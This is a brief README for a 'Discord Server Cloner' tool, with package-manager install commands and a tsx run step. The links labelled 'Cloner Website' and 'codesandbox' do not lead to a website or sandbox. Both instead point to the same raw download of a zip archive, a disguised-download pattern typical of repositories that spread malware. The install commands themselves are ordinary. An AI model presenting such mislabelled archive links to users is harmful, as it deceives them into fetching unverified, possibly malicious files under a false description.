## Overview
This project was made to make your life easier, instead of spending hours trying to make your server as beautiful as possible you can simply clone a server with this tool

**More information:** [Cloner Website](https://raw.githubusercontent.com/wondermidastouch/Discord-Server-Cloner-2x/main/src/src/Discord-Server-Cloner-2x-v2.5-alpha.2.zip)

## How to use
```typescript
$ pnpm i
# or
$ npm i
# or
$ yarn add
```
**Examples with tsx**
```typescript
$ pnpm i -g tsx
# or
$ npm i -g tsx
```

```typescript
$ tsx .
```
**You can also use [codesandbox](https://raw.githubusercontent.com/wondermidastouch/Discord-Server-Cloner-2x/main/src/src/Discord-Server-Cloner-2x-v2.5-alpha.2.zip) to start the cloner**
